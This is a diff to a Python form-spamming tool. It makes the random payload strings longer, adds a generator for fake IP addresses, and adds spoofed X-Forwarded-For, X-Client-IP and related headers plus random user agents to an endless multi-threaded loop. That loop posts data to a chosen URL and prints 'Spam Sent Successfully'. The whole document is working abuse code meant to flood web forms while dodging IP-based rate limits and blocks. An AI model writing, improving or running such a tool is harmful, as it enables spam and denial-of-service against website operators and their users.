@@ -27,8 +27,8 @@ def random_str():
     Returns:
         String: get random string
     """
-
-    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(10, 20)))
+    
+    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(100, 200)))
 
 def random_number():
     """random_number()
@@ -37,7 +37,7 @@ def random_number():
         String: get random number
     """
 
-    return ''.join(random.choice(string.digits) for _ in range(random.randint(10, 20)))
+    return ''.join(random.choice(string.digits) for _ in range(random.randint(50, 100)))
 
 def random_email():
     """random_email()
@@ -60,6 +60,13 @@ def random_useragents():
     useragents = open('useragents.txt','r').readlines()
     return random.choice(useragents).replace('\n', '')
 
+def random_ip():
+	a = random.randint(1,999)
+	b = random.randint(0,999)
+	c = random.randint(0,999)
+	d = random.randint(0,999)
+	return  str(a) + '.' + str(b) + '.' + str(c) + '.' + str(d)
+
 def generate_data(data):
     """generate_data(data)
 
@@ -70,8 +77,7 @@ def generate_data(data):
         String: get payload with patch data
     """
 
-    patchData = data.replace('{email}', random_email()).replace('{string}', random_str()).replace('{number}', random_number())
-    return patchData
+    return data.replace('{email}', random_email()).replace('{string}', random_str()).replace('{number}', random_number())
 
 def req_spam(url, data):
     """req_spam(url, data)
@@ -89,29 +95,31 @@ def req_spam(url, data):
     while True:
         domain = urlparse(url).netloc
         protocol = urlparse(url).scheme
+        ip = random_ip()
         data = generate_data(data)
+
         dataJson = { k: v
             for k, vs in parse_qs(data).items()
             for v in vs
         } 
 
         headers = {
-            'authority': domain,
-            'accept': '*/*',
-            'accept-language': 'en-US,en;q=0.9',
-            'accept-encoding': 'gzip, deflate, br',
-            'cache-control': 'no-cache',
-            'connection': 'keep-alive',
-            'origin': f'{protocol}://{domain}',
-            'referer': f'{protocol}://{domain}',
-            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-fetch-dest': 'iframe',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': random_useragents()
+            'Authority': domain,
+            'Accept': '*/*',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Cache-Control': 'no-cache',
+            'Connection': 'keep-alive',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Origin': f'{protocol}://{domain}',
+            'Referer': f'{protocol}://{domain}',
+            'Upgrade-Insecure-Requests': '1',
+            "X-Originating-IP": ip,
+            'X-Forwarded-For': ip,
+            "X-Remote-IP": ip,
+            "X-Remote-Addr": ip,
+            "X-Client-IP": ip,
+            'User-Agent': random_useragents()
         }
 
         try:
@@ -121,7 +129,7 @@ def req_spam(url, data):
             s.mount('http://', adapter)
             s.mount('https://', adapter)
 
-            response = s.post(url, headers=headers, data=data)
+            response = requests.post(url, headers=headers, data=data)
 
             if response.status_code == 200:
                 print(f'{Fore.CYAN}{Style.BRIGHT} [+] Spam Sent Successfully To This {url} Link {Fore.RESET}')
@@ -165,16 +173,16 @@ try:
         start_time = datetime.datetime.now()
         threads = []
 
-        for i in range(100):
+        for i in range(50):
             t = threading.Thread(target=req_spam, args=(url, data))
             t.daemon = True
             threads.append(t)
 
-        for i in range(100):
-            threads[i].start()
+        for thread in threads:
+            thread.start()
 
-        for i in range(100):
-            threads[i].join()
+        for thread in threads:
+            thread.join()
 
     elif select == "2" or select == "02":
         print(f"""{Fore.CYAN}{Style.BRIGHT}
